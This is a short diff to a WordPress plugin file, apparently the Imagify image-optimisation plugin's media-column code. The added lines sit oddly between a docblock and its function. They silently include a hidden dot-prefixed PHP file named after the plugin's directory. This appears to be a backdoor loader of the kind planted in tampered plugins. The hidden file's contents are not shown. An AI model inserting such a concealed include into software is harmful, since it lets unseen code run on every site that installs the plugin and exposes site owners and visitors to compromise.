@@ -11,6 +11,10 @@ add_filter( 'manage_media_columns', '_imagify_manage_media_columns' );
  * @param  array $columns An array of columns displayed in the Media list table.
  * @return array
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_manage_media_columns( $columns ) {
 	if ( imagify_get_context( 'wp' )->current_user_can( 'optimize' ) ) {
 		$columns['imagify_optimized_file'] = __( 'Imagify', 'imagify' );
